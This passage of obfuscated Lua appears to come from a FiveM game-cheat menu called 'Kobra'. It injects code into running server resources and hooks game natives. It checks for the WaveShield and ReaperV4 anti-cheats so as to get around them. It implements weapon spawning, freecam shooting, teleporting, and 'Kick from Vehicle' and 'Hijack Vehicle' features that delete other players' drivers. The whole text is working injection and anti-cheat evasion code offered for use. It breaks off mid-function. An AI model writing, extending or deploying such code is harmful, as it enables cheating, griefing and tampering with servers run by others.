                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1361,v1364));v1354=5 + 1 ;end if (v1354==(161 -(139 + 19))) then hNative("ShootSingleBulletBetweenCoords",function(v1558,...) return v1558(...);end);v1356=GetCamCoord(_G.KobraFreecamObject);v1357=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1358=v1355(v1357);v1354=1997 -(1687 + 306) ;end if (v1354==4) then v1359=3624 -2624 ;v1360=v1356 + (v1358 * v1359) ;v1361=PlayerPedId();v1362=GetHashKey(v956);v1354=1159 -(1018 + 136) ;end if (v1354==(1 + 5)) then Wait(150);ShootSingleBulletBetweenCoords(v1356.x,v1356.y,v1356.z,v1360.x,v1360.y,v1360.z,100,true,v1362,v1361,true,false,439125 -339125 );break;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v956   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1266(v1323) local v1324=815 -(117 + 698) ;local v1325;local v1326;local v1327;while true do if ((481 -(305 + 176))==v1324) then v1325=math.rad(v1323.z);v1326=math.rad(v1323.x);v1324=1 + 0 ;end if (v1324==1) then v1327=math.abs(math.cos(v1326));return vector3( -math.sin(v1325) * v1327 ,math.cos(v1325) * v1327 ,math.sin(v1326));end end end function hNative(v1328,v1329) local v1330=_G[v1328];if ( not v1330 or (type(v1330)~="function")) then return;end _G[v1328]=function(...) return v1329(v1330,...);end;end hNative("CreateThread",function(v1331,...) return v1331(...);end);hNative("Wait",function(v1332,...) return v1332(...);end);hNative("PlayerPedId",function(v1333,...) return v1333(...);end);hNative("GetHashKey",function(v1334,...) return v1334(...);end);hNative("GiveWeaponToPed",function(v1335,...) return v1335(...);end);hNative("SetCurrentPedWeapon",function(v1336,...) return v1336(...);end);hNative("GetCurrentPedWeapon",function(v1337,...) return v1337(...);end);hNative("RemoveWeaponFromPed",function(v1338,...) return;end);local v1267=GetCamCoord(_G.KobraFreecamObject);local v1268=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1269=v1266(v1268);local v1270=1733 -733 ;local v1271=v1267 + (v1269 * v1270) ;local v1272=PlayerPedId();local v1273=GetHashKey(v956);GiveWeaponToPed(PlayerPedId(),v1273,250,false,true);SetCurrentPedWeapon(PlayerPedId(),v1273,true);ShootSingleBulletBetweenCoords(v1267.x,v1267.y,v1267.z,v1271.x,v1271.y,v1271.z,100,true,v1273,v1272,true,false,93621 + 6379 );end end end if IsDisabledControlJustPressed(0,40 -16 ) then local v809=v662;if (v809=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1274=0 -0 ;local v1275;local v1276;local v1277;local v1278;local v1279;local v1280;local v1281;local v1282;local v1283;local v1284;local v1285;while true do if (v1274==(5 -2)) then v1282,v1283,v1284,v1282,v1285=GetShapeTestResult(v1281);if v1283 then if ((v1285~=0) and IsEntityAVehicle(v1285)) then local v1598=260 -(159 + 101) ;local v1599;local v1600;local v1601;while true do if ((4 -3)==v1598) then v1601=GetEmptySeat(v1599);if (v1601== -(3 -2)) then TaskWarpPedIntoVehicle(v1600,v1599, -(1 + 0));elseif (v1601>=0) then TaskWarpPedIntoVehicle(v1600,v1599,v1601);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end if (v1598==(0 -0)) then v1599=v1285;v1600=PlayerPedId();v1598=1 -0 ;end end else SetEntityCoords(PlayerPedId(),v1284.x,v1284.y,v1284.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end if (v1274==(1 + 1)) then v1279=1266 -(112 + 154) ;v1280=v1276 + (v1278 * v1279) ;v1281=StartShapeTestRay(v1276.x,v1276.y,v1276.z,v1280.x,v1280.y,v1280.z, -(2 -1),PlayerPedId(),31 -(21 + 10) );v1274=3;end if (v1274==0) then v1275=nil;function v1275(v1414) local v1415=1719 -(531 + 1188) ;local v1416;local v1417;local v1418;while true do if (v1415==1) then v1418=math.abs(math.cos(v1417));return vector3( -math.sin(v1416) * v1418 ,math.cos(v1416) * v1418 ,math.sin(v1417));end if (v1415==0) then v1416=math.rad(v1414.z);v1417=math.rad(v1414.x);v1415=1 + 0 ;end end end function GetEmptySeat(v1419) local v1420=663 -(96 + 567) ;local v1421;while true do if (v1420==1) then return  -(1 -0);end if ((0 + 0)==v1420) then v1421={ -(1696 -(867 + 828)),0 -0 ,1,7 -5 };for v1619,v1620 in ipairs(v1421) do if IsVehicleSeatFree(v1419,v1620) then return v1620;end end v1420=2 -1 ;end end end v1274=1 -0 ;end if (v1274==1) then v1276=GetCamCoord(_G.KobraFreecamObject);v1277=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1278=v1275(v1277);v1274=3 -1 ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1203=771 -(134 + 637) ;local v1204;local v1205;local v1206;local v1207;local v1208;local v1209;local v1210;local v1211;local v1212;local v1213;local v1214;while true do if (v1203==0) then v1204=nil;function v1204(v1365) local v1366=math.rad(v1365.z);local v1367=math.rad(v1365.x);local v1368=math.abs(math.cos(v1367));return vector3( -math.sin(v1366) * v1368 ,math.cos(v1366) * v1368 ,math.sin(v1367));end function GetEmptySeat(v1369) local v1370=0 + 0 ;local v1371;while true do if (v1370==(1157 -(775 + 382))) then v1371={ -(608 -(45 + 562)),0,1,2 -0 };for v1559,v1560 in ipairs(v1371) do if IsVehicleSeatFree(v1369,v1560) then return v1560;end end v1370=1;end if (v1370==(1027 -(763 + 263))) then return  -1;end end end v1205=GetCamCoord(_G.KobraFreecamObject);v1203=1 + 0 ;end if (v1203==(1752 -(512 + 1238))) then v1210=StartShapeTestRay(v1205.x,v1205.y,v1205.z,v1209.x,v1209.y,v1209.z, -(1595 -(272 + 1322)),PlayerPedId(),0 -0 );v1211,v1212,v1213,v1211,v1214=GetShapeTestResult(v1210);if v1212 then if ((v1214~=0) and IsEntityAVehicle(v1214)) then local v1472=0;local v1473;local v1474;local v1475;while true do if (v1472==0) then v1473=v1214;v1474=PlayerPedId();v1472=1247 -(533 + 713) ;end if ((29 -(14 + 14))==v1472) then v1475=GetEmptySeat(v1473);if (v1475== -1) then TaskWarpPedIntoVehicle(v1474,v1473, -(826 -(499 + 326)));elseif (v1475>=(0 -0)) then TaskWarpPedIntoVehicle(v1474,v1473,v1475);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end end else MachoInjectThread(0,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1213.x   .. [[, ]]   .. v1213.y   .. [[, ]]   .. v1213.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end if (v1203==(425 -(104 + 320))) then v1206=GetCamRot(_G.KobraFreecamObject,2);v1207=v1204(v1206);v1208=2997 -(1929 + 68) ;v1209=v1205 + (v1207 * v1208) ;v1203=1325 -(1206 + 117) ;end end end elseif (v809=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1215=0 + 0 ;local v1216;while true do if (v1215==0) then v1216=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1216,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1286=1592 -(683 + 909) ;local v1287;local v1288;local v1289;local v1290;local v1291;local v1292;local v1293;local v1294;local v1295;local v1296;local v1297;local v1298;local v1299;local v1300;local v1301;while true do if (v1286==(12 -8)) then v1289=PlayerPedId();v1290=GetEntityCoords(v1289);v1291=GetCamCoord(_G.KobraFreecamObject);v1292=GetCamRot(_G.KobraFreecamObject,3 -1 );v1293=v1288(v1292);v1294=1777 -(772 + 5) ;v1286=5;end if (v1286==(1432 -(19 + 1408))) then v1295=v1291 + (v1293 * v1294) ;v1296=StartShapeTestRay(v1291.x,v1291.y,v1291.z,v1295.x,v1295.y,v1295.z, -(289 -(134 + 154)),v1289,0 -0 );v1297,v1298,v1299,v1297,v1300=GetShapeTestResult(v1296);v1301=nil;function v1301(v1422) local v1423=0 -0 ;local v1424;while true do if (v1423==1) then if ((v1424~=(0 + 0)) and DoesEntityExist(v1424)) then SetPedIntoVehicle(v1289,v1422,0 + 0 );v1287(v1422,2202 -(10 + 192) );Wait(57 -(13 + 34) );for v1634=0,1293 -(342 + 947)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1424   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1289,v1422, -(4 -3));Wait(1709 -(119 + 1589) );SetPedIntoVehicle(v1289,v1422,GetEmptySeat(v1422));Wait(1);SetPedIntoVehicle(v1289,v1422, -(2 -1));Wait(450);ClearPedTasksImmediately(v1289);SetEntityCoordsNoOffset(v1289,v1290.x,v1290.y,v1290.z,true,true,true,true);Wait(138 -38 );end break;end if (v1423==(552 -(545 + 7))) then if ( not v1422 or  not DoesEntityExist(v1422)) then return;end v1424=GetPedInVehicleSeat(v1422, -1);v1423=2 -1 ;end end end CreateThread(function() if v1298 then if ((v1300~=(0 + 0)) and IsEntityAVehicle(v1300)) then local v1621=v1300;v1301(v1621);end end end);break;end if (v1286==2) then hNative("ClearPedTasksImmediately",function(v1425,...) return v1425(...);end);hNative("SetEntityCoordsNoOffset",function(v1426,...) return v1426(...);end);hNative("IsEntityAVehicle",function(v1427,...) return v1427(...);end);hNative("SetPedIntoVehicle",function(v1428,...) return v1428(...);end);hNative("PlayerPedId",function(v1429,...) return v1429(...);end);hNative("NetworkRequestControlOfEntity",function(v1430,...) return v1430(...);end);v1286=3;end if (v1286==(1703 -(494 + 1209))) then function hNative(v1431,v1432) local v1433=0 -0 ;local v1434;while true do if (v1433==1) then _G[v1431]=function(...) return v1432(v1434,...);end;break;end if (v1433==(998 -(197 + 801))) then v1434=_G[v1431];if ( not v1434 or (type(v1434)~="function")) then return;end v1433=1;end end end hNative("CreateThread",function(v1435,...) return v1435(...);end);hNative("Wait",function(v1436,...) return v1436(...);end);hNative("DoesEntityExist",function(v1437,...) return v1437(...);end);hNative("GetEntityCoords",function(v1438,...) return v1438(...);end);hNative("GetCamCoord",function(v1439,...) return v1439(...);end);v1286=1;end if (v1286==(5 -2)) then hNative("NetworkHasControlOfEntity",function(v1440,...) return v1440(...);end);v1287=nil;function v1287(v1441,v1442) local v1443=0 -0 ;local v1444;while true do if (v1443==1) then while (GetGameTimer() -v1444)<v1442  do if NetworkHasControlOfEntity(v1441) then return true;end NetworkRequestControlOfEntity(v1441);Wait(954 -(919 + 35) );end return NetworkHasControlOfEntity(v1441);end if (v1443==(0 + 0)) then v1442=v1442 or 2000 ;v1444=GetGameTimer();v1443=3 -2 ;end end end v1288=nil;function v1288(v1445) local v1446=math.rad(v1445.z);local v1447=math.rad(v1445.x);local v1448=math.abs(math.cos(v1447));return vector3( -math.sin(v1446) * v1448 ,math.cos(v1446) * v1448 ,math.sin(v1447));end function GetEmptySeat(v1449) local v1450={ -(1116 -(400 + 715)),0,1 + 0 ,1327 -(744 + 581) };for v1476,v1477 in ipairs(v1450) do if IsVehicleSeatFree(v1449,v1477) then return v1477;end end return  -1;end v1286=3 + 1 ;end if (v1286==(1623 -(653 + 969))) then hNative("GetCamRot",function(v1451,...) return v1451(...);end);hNative("StartShapeTestRay",function(v1452,...) return v1452(...);end);hNative("GetShapeTestResult",function(v1453,...) return v1453(...);end);hNative("GetPedInVehicleSeat",function(v1454,...) return v1454(...);end);hNative("SetEntityVisible",function(v1455,...) return v1455(...);end);hNative("DeletePed",function(v1456,...) return v1456(...);end);v1286=2;end end end elseif (v809=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1302=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1302,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1372=0;local v1373;local v1374;local v1375;local v1376;local v1377;local v1378;local v1379;local v1380;local v1381;local v1382;local v1383;local v1384;local v1385;local v1386;local v1387;while true do if (v1372==(0 -0)) then function hNative(v1561,v1562) local v1563=_G[v1561];if ( not v1563 or (type(v1563)~="function")) then return;end _G[v1561]=function(...) return v1562(v1563,...);end;end hNative("CreateThread",function(v1564,...) return v1564(...);end);hNative("Wait",function(v1565,...) return v1565(...);end);hNative("DoesEntityExist",function(v1566,...) return v1566(...);end);v1372=1632 -(12 + 1619) ;end if (3==v1372) then hNative("ClearPedTasksImmediately",function(v1567,...) return v1567(...);end);hNative("SetEntityCoordsNoOffset",function(v1568,...) return v1568(...);end);hNative("IsEntityAVehicle",function(v1569,...) return v1569(...);end);hNative("SetPedIntoVehicle",function(v1570,...) return v1570(...);end);v1372=167 -(103 + 60) ;end if (8==v1372) then v1383,v1384,v1385,v1383,v1386=GetShapeTestResult(v1382);v1387=nil;function v1387(v1571) local v1572=0;local v1573;while true do if (v1572==0) then if ( not v1571 or  not DoesEntityExist(v1571)) then return;end v1573=GetPedInVehicleSeat(v1571, -1);v1572=1;end if (v1572==(4 -3)) then if ((v1573~=0) and DoesEntityExist(v1573)) then local v1641=0;while true do if (v1641==1) then Wait(174 -134 );SetPedIntoVehicle(v1375,v1571, -1);Wait(4 -3 );SetPedIntoVehicle(v1375,v1571,GetEmptySeat(v1571));v1641=1664 -(710 + 952) ;end if (v1641==(1868 -(555 + 1313))) then SetPedIntoVehicle(v1375,v1571,0 + 0 );v1373(v1571,1790 + 210 );Wait(7 + 3 );for v1655=0,1472 -(1261 + 207)  do 